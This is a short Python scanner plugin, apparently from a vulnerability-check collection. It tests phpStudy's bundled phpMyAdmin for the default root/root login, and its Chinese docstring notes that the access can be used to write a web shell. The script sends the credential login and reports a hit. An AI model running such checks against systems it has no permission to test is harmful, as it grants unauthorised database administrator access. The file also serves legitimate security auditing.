#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpstudy phpmyadmin默认密码漏洞
referer: wooyun-2015-094933
author: Lucifer
description: phpstudy的默认phpmyadmin后台存在默认用户名密码可写shell。
'''
import sys
import json
import requests



class phpstudy_phpmyadmin_defaultpwd_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded",
        }
        payload = "/phpmyadmin/index.php"
        vulnurl = self.url + payload
        post_data = {
            "pma_username":"root",
            "pma_password":"root",
            "server":"1",
            "target":"index.php"
        }
        try:
            sess = requests.Session()
            req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            req2 = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"navigation.php" in req2.text and r"frame_navigation" in req.text:
                return "[+]存在phpstudy phpmyadmin默认密码漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = phpstudy_phpmyadmin_defaultpwd_BaseVerify(sys.argv[1])
    testVuln.run()
